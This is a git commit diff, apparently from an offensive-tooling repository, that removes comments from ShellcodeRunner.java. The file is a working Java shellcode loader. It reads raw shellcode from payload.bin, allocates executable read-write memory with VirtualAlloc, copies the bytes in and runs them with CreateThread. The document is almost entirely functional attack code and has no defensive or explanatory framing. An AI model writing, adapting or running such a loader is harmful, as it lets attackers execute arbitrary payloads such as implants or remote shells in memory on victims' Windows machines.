183704a6376f319ce234e58f1898c1ee17f574bf
Vulnz <r3d@RAMBLER.RU>
2025-11-30 05:00:22 -0800

    Add files via upload

--- 18versionshell/ShellcodeRunner.java
+++ 18versionshell/ShellcodeRunner.java
@@ -17,10 +17,8 @@ public class ShellcodeRunner {
     }
 
     public static void main(String[] args) throws Exception {
-        // Load the shellcode file
         byte[] shellcode = Files.readAllBytes(Paths.get("payload.bin"));
 
-        // Allocate RWX memory
         Pointer memory = Kernel32.INSTANCE.VirtualAlloc(
                 Pointer.NULL,
                 shellcode.length,
@@ -28,15 +26,12 @@ public class ShellcodeRunner {
                 Kernel32.PAGE_EXECUTE_READWRITE
         );
 
-        // Copy shellcode to memory
         memory.write(0, shellcode, 0, shellcode.length);
 
-        // Execute shellcode in a new thread
         Pointer thread = Kernel32.INSTANCE.CreateThread(
                 Pointer.NULL, 0, memory, Pointer.NULL, 0, Pointer.NULL
         );
 
-        // Wait for execution to complete
         Kernel32.INSTANCE.WaitForSingleObject(thread, Kernel32.INFINITE);
     }
 }
